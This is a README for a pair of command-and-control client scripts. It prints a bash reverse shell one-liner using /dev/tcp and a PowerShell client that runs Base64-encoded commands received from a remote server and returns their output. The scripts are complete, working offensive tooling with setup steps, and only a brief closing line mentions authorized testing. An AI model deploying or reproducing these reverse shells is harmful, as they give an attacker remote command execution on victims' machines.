# Client Reverse Shell Scripts

This directory contains the client-side reverse shell scripts that work in conjunction with the C2 server (located in the `server` directory). There are two scripts provided:

- **client.sh** – for Linux/Unix systems  
- **client.ps1** – for Windows systems

Both scripts are designed to establish a reverse shell connection to the C2 server and receive payload commands. They also set an environment variable (`TASK`) that is used by the server to decide which payload to deliver.

---

## Repository Structure

```
.
├── client
│   ├── client.sh       # Linux reverse shell client script
│   └── client.ps1      # Windows reverse shell client script
└── server
    └── server.py       # Command and Control server and its components
```

---

## Overview

### How It Works

- **Connection Establishment:**  
  Each client script creates a TCP connection to the server.  
  - On Linux, the reverse shell is initiated via a bash interactive shell.
  - On Windows, a PowerShell process handles the connection and payload execution.

- **Payload Execution:**  
  Once connected, the client waits for a Base64-encoded payload (command) from the server, decodes it, and executes it.  
  The output (stdout, stderr, and exit code) is then encoded and sent back to the server as a JSON response.

- **TASK Environment Variable:**  
  The `TASK` variable (defaulted to `"example"`) is set by the client scripts. The server uses this value to determine which payload script (e.g., bash or PowerShell) should be executed on the client side.

---

## Client Scripts

### client.sh (Linux)

```bash
#!/bin/bash
echo "Triggering reverse shell to $SERVER_IP:$SERVER_PORT ..."
TASK="example" /bin/bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
```

- **Usage:**  
  - Ensure that the environment variables `SERVER_IP` and `SERVER_PORT` are set to point to your C2 server.
  - This script initiates a reverse shell by connecting to the provided server address and port.
  - It exports the `TASK` variable, which informs the server of the payload to deliver.

### client.ps1 (Windows)

```powershell
# Define server and port
$server = "xxx.xxx.xxx.xxx" # Replace with your server's IP address or hostname
$port = 4444
$TASK="example"

# Create a TCP connection
$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
$encoding = [System.Text.Encoding]::UTF8
$reader = New-Object System.IO.StreamReader($stream, $encoding)
$writer = New-Object System.IO.StreamWriter($stream, $encoding)
$writer.AutoFlush = $true

while (($payloadEncoded = $reader.ReadLine()) -ne $null) {
    # Decode the Base64-encoded payload to retrieve the command
    Write-Host "Received payload: $payloadEncoded"
    try {
        $payloadBytes = [System.Convert]::FromBase64String($payloadEncoded)
        $command = $encoding.GetString($payloadBytes)
    }
    catch {
        Write-Host "Failed to decode payload: $_"
        Write-Host "Received raw payload: " + $payloadEncoded.Trim()
        $command = $payloadEncoded.Trim()
    }
    Write-Host "Decoded command: $($command.Trim())"

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "powershell.exe"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes('$ProgressPreference = "SilentlyContinue"; $TASK="' + $TASK + '";' + $command)
    $encodedCommand = [System.Convert]::ToBase64String($bytes)
    $process.StartInfo.Arguments = "-NoProfile -EncodedCommand $encodedCommand"
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true

    # Set an environment variable for the process
    $process.StartInfo.EnvironmentVariables["TASK"] = $TASK

    $process.Start() | Out-Null

    # Capture the outputs.
    $output = $process.StandardOutput.ReadToEnd().Trim()
    $errorOutput = $process.StandardError.ReadToEnd().Trim()
    $exitCode = $process.ExitCode

    $process.WaitForExit()

    # Now $output and $errorOutput contain the stdout and stderr, respectively.
    Write-Output "Output: $output"
    Write-Output "Error output: $errorOutput"
    Write-Output "Exit code: $exitCode"

    $stdoutBytes     = [System.Text.Encoding]::UTF8.GetBytes($output)
    $stderrBytes     = [System.Text.Encoding]::UTF8.GetBytes($errorOutput)

    # Build a JSON response (you could add more details if needed)
    $response = @{
        session_id = $(if ($env:SESSION_ID) { $env:SESSION_ID } else { "" })
        task       = $TASK
        stdout     = [System.Convert]::ToBase64String($stdoutBytes)
        stderr     = [System.Convert]::ToBase64String($stderrBytes)
        returncode = $exitCode
    }
    $json = $response | ConvertTo-Json -Compress

    # Send the JSON response followed by a newline
    $writer.WriteLine($json)
}

$client.Close()
```

- **Usage:**  
  - Edit the `$server` variable to set your C2 server’s IP address or hostname.
  - The script uses port `4444` by default; update `$port` if needed.
  - It establishes a TCP connection and continuously listens for Base64-encoded commands.
  - Each payload is decoded and executed using PowerShell, with outputs sent back to the server in JSON format.

---

## Setup and Execution

### Prerequisites

- **For Linux Client:**
  - A Unix-like environment (Linux, macOS, etc.)
  - Bash shell
  - Access to the target C2 server over the network

- **For Windows Client:**
  - Windows PowerShell (v5.1 or later)
  - Access to the target C2 server over the network

### Running the Client

1. **Configure Server Details:**

   - **Linux:**  
     Set the environment variables `SERVER_IP` and `SERVER_PORT` before running the script. For example:
     ```bash
     export SERVER_IP="192.168.1.100"
     export SERVER_PORT="4444"
     ./client.sh
     ```

   - **Windows:**  
     Open the `client.ps1` file in a text editor and update the `$server` and `$port` variables with your C2 server's details. Then, run the script from PowerShell:
     ```powershell
     .\client.ps1
     ```

2. **Execution:**  
   Once executed, the client will connect to the server and wait for payloads. The server will deliver Base64-encoded commands which the client decodes, executes, and then returns a JSON response containing the execution results.

---

## Customization

- **TASK Variable:**  
  The `TASK` environment variable determines which payload the server will send. You can change the default value (`"example"`) to match your requirements.

- **Logging and Output:**  
  Both scripts print status messages to help track the connection and command execution process. Adjust the verbosity as needed.

- **Payload Handling:**  
  The client scripts are designed to work with the payload delivery mechanism of the C2 server. Ensure that any payloads provided by the server are compatible with your client environment (bash for Linux and PowerShell for Windows).

---

## Security Considerations

- **Use in Controlled Environments:**  
  These scripts are intended for authorized testing or research purposes only. Running a reverse shell can expose your system to significant risk if misused.

- **Network Security:**  
  Ensure that the network and systems are secure and that only trusted entities can connect to your server.